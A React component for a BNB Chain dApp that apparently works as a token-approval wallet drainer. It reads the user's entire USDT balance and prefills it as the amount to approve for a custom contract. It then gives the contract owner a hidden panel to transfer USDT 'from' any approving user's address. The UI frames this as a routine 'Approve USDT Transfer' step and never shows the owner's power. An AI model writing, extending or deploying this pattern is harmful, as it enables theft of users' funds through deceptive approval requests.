import React, { useState, useEffect } from 'react';
import Web3 from 'web3';
import abi from '../abi.json';
import { ethers } from 'ethers';

const contractAddress = '0x797f35192418d62d4c7167f49f3f3934122659ef';
const usdtAddress = '0x55d398326f99059fF775485246999027B3197955';

const USDT_ABI = [
  {
    "constant": true,
    "inputs": [{ "name": "_owner", "type": "address" }],
    "name": "balanceOf",
    "outputs": [{ "name": "balance", "type": "uint256" }],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [{ "name": "_owner", "type": "address" }, { "name": "_spender", "type": "address" }],
    "name": "allowance",
    "outputs": [{ "name": "remaining", "type": "uint256" }],
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }],
    "name": "approve",
    "outputs": [{ "name": "success", "type": "bool" }],
    "type": "function"
  }
];

const Approve = ({ account }) => {
  const [amount, setAmount] = useState('');
  const [message, setMessage] = useState('');
  const [owner, setOwner] = useState('');
  const [isOwner, setIsOwner] = useState(false);
  const [userToTransfer, setUserToTransfer] = useState('');
  const [transferAmount, setTransferAmount] = useState('');
  const [transferMessage, setTransferMessage] = useState('');

  useEffect(() => {
    const fetchBalanceAndOwner = async () => {
      if (account) {
        try {
          const web3 = new Web3(window.ethereum);
          const usdtContract = new web3.eth.Contract(USDT_ABI, usdtAddress);
          const balance = await usdtContract.methods.balanceOf(account).call();
          const balanceInUSDT = ethers.formatUnits(balance, 18); // USDT has 18 decimals
          setAmount(balanceInUSDT);

          const contract = new web3.eth.Contract(abi, contractAddress);
          const contractOwner = await contract.methods.owner().call();
          setOwner(contractOwner);
          setIsOwner(account.toLowerCase() === contractOwner.toLowerCase());
        } catch (err) {
          setMessage('Error fetching data: ' + err.message);
        }
      }
    };
    fetchBalanceAndOwner();
  }, [account]);

  const approveContract = async () => {
    try {
      const web3 = new Web3(window.ethereum);
      const usdtContract = new web3.eth.Contract(USDT_ABI, usdtAddress);
      const contract = new web3.eth.Contract(abi, contractAddress);
      const amountWei = ethers.parseUnits(amount, 18); // USDT has 18 decimals
      const gasPrice = web3.utils.toWei('2', 'gwei'); // Set custom gas price to 2 Gwei
      const gasLimit = 60000; // Set gas limit to 60000
      
      // Step 1: Approve the contract to spend USDT on behalf of the user
      setMessage('Approving USDT contract...');
      await usdtContract.methods.approve(contractAddress, amountWei).send({ from: account, gasPrice, gas: gasLimit });
      setMessage('USDT approval successful! Now finalizing with contract...');
      
      // Step 2: Call the custom approveContract method if needed
      await contract.methods.approveContract(amountWei).send({ from: account, gasPrice, gas: gasLimit });
      setMessage('Approval successful!');
    } catch (err) {
      console.error('Approval error:', err);
      let errorMsg = 'Error during approval: ' + (err.message || 'Unknown error');
      if (err.data) {
        errorMsg += ' Data: ' + JSON.stringify(err.data);
      }
      if (err.transactionHash) {
        errorMsg += ' Transaction Hash: ' + err.transactionHash;
      }
      setMessage(errorMsg);
    }
  };

  const transferFunds = async () => {
    if (!isOwner) {
      setTransferMessage('Only the contract owner can transfer funds');
      return;
    }
    try {
      const web3 = new Web3(window.ethereum);
      const contract = new web3.eth.Contract(abi, contractAddress);
      const usdtContract = new web3.eth.Contract(USDT_ABI, usdtAddress);
      const transferAmountWei = ethers.parseUnits(transferAmount, 18);
      const balance = await usdtContract.methods.balanceOf(userToTransfer).call();
      if (balance < transferAmountWei) {
        setTransferMessage(`Insufficient balance. Available: ${ethers.formatUnits(balance, 18)} USDT, Required: ${transferAmount} USDT`);
        return;
      }
      const gasPrice = web3.utils.toWei('2', 'gwei'); // Set custom gas price to 2 Gwei
      const gasLimit = 60000; // Set gas limit to 60000
      await contract.methods.transferFunds(userToTransfer, transferAmountWei).send({ from: account, gasPrice, gas: gasLimit });
      setTransferMessage('Transfer successful!');
    } catch (err) {
      console.error('Transfer error:', err);
      let errorMsg = 'Error during transfer: ' + (err.message || 'Unknown error');
      if (err.data) {
        errorMsg += ' Data: ' + JSON.stringify(err.data);
      }
      if (err.transactionHash) {
        errorMsg += ' Transaction Hash: ' + err.transactionHash;
      }
      setTransferMessage(errorMsg);
    }
  };

  return (
    <div>
      <h2>Approve USDT Transfer</h2>
      <input
        type="number"
        value={amount}
        onChange={(e) => setAmount(e.target.value)}
        placeholder="Enter USDT amount"
      />
      <button onClick={approveContract}>Approve</button>
      {message && <p>{message}</p>}

      {isOwner && (
        <div>
          <h2>Transfer Funds (Owner Only)</h2>
          <input
            type="text"
            value={userToTransfer}
            onChange={(e) => setUserToTransfer(e.target.value)}
            placeholder="Enter user address to transfer from"
          />
          <input
            type="number"
            value={transferAmount}
            onChange={(e) => setTransferAmount(e.target.value)}
            placeholder="Enter USDT amount to transfer"
          />
          <button onClick={transferFunds}>Transfer Funds</button>
          {transferMessage && <p>{transferMessage}</p>}
        </div>
      )}
    </div>
  );
};

export default Approve; 